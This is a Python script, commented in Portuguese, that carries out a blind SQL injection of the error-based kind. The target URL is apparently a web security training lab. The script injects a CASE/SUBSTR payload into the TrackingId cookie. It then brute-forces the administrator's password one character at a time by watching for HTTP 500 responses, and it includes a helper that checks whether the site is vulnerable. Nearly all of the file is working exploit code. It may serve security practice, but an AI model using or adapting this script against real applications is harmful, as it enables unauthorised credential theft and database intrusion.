import requests
import string

################ Verificar se a aplicação é vulnerável ao ataque ########################
def is_vulnerable(url):
    """
    Testa se a aplicação é vulnerável a SQL Injection injetando um payload de teste no cookie.
    
    Args:
    - url (str): URL do endpoint alvo.

    Returns:
    - bool: Retorna True se a aplicação for vulnerável, False caso contrário.
    """
    # Payload de teste para verificar a vulnerabilidade
    test_payload = input("Informe o payload para testar aplicação: ")
    
    # Configura o cookie com o payload de teste
    cookies = {"TrackingId": test_payload}
    
    # Envia a requisição
    response = requests.get(url, cookies=cookies)
    
    # Verifica se o status code é 200'||(SELECT '' FROM not-a-real-table)||'
    if response.status_code == 200:
        print("A aplicação parece vulnerável a SQL Injection.")
        return True
    else:
        print("A aplicação não parece vulnerável a SQL Injection.")
        return False

################ Inicia o ataque com o payload #########################

def sqli_exploit(url, max_requests, status_check, cookie_template, tamanho_senha):
    """
    Realiza um ataque Blind SQLi controlado, descobrindo cada caractere da senha um por vez.
    Limitado a uma única requisição ativa por vez.

    Argumentos:
    - url (str): URL do endpoint alvo.
    - max_requests (int): Número máximo de requisições permitidas.
    - status_check (int): Código de status HTTP a ser verificado para sucesso (ex.: 500).
    - cookie_template (str): Template do payload SQLi no cookie, com $1 e $2 como placeholders.
    - tamanho_senha (int): Comprimento estimado da senha a ser descoberta.
    """

    # Criando uma sessão para manter uma única conexão
    session = requests.Session()

    # Definindo o conjunto de caracteres a serem testados
    charset = string.ascii_lowercase + string.digits  # Exemplo: 'abcdefghijklmnopqrstuvwxyz0123456789'
    senha_encontrada = ""
    request_count = 0

    # Percorre cada posição da senha
    for posicao in range(1, tamanho_senha + 1):
        encontrado = False

        # Testa cada caractere no conjunto de caracteres para a posição atual
        for char in charset:
            # Substitui $1 pela posição e $2 pelo caractere atual do charset
            payload = cookie_template.replace("$1", str(posicao)).replace("$2", char)

            # Configura o cookie com o payload SQLi
            cookies = {"TrackingId": payload}

            # Exibe o payload para depuração
            print(f"Tentando payload para posição {posicao} com caractere '{char}': {payload}")

            # Envia a requisição de forma síncrona com a sessão
            response = session.get(url, cookies=cookies)
            request_count += 1

            # Exibe o status code para depuração
            print(f"Status Code: {response.status_code}")

            # Verifica se o status code corresponde ao esperado (ex.: 500)
            if response.status_code == status_check:
                senha_encontrada += char  # Adiciona o caractere correto à senha
                print(f"Caractere encontrado para posição {posicao}: {char}")
                encontrado = True
                break  # Sai do loop interno e passa para a próxima posição

            # Verifica se o limite de requisições foi atingido
            if request_count >= max_requests:
                print("Número máximo de requisições atingido.")
                return senha_encontrada

        # Se nenhum caractere for encontrado para a posição atual, encerra a busca
        if not encontrado:
            print(f"Nenhum caractere encontrado para a posição {posicao}. Encerrando.")
            break

    print(f"Senha encontrada: {senha_encontrada}")
    return senha_encontrada

# Configurações do ataque
url = "https://0a0800ab035dfe87808d3fa400370034.web-security-academy.net/"
max_requests = 1000
status_check = 500
cookie_template = "'||(SELECT CASE WHEN SUBSTR(password,$1,1)='$2' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
tamanho_senha = 20  # Defina o comprimento estimado da senha

# Executa o ataque SQLi
senha_encontrada = sqli_exploit(url, max_requests, status_check, cookie_template, tamanho_senha)
print(f"Senha final: {senha_encontrada}")


# Executa o ataque SQLi

#teste_app = is_vulnerable(url)
#print(f"A aplicação é: {teste_app}")
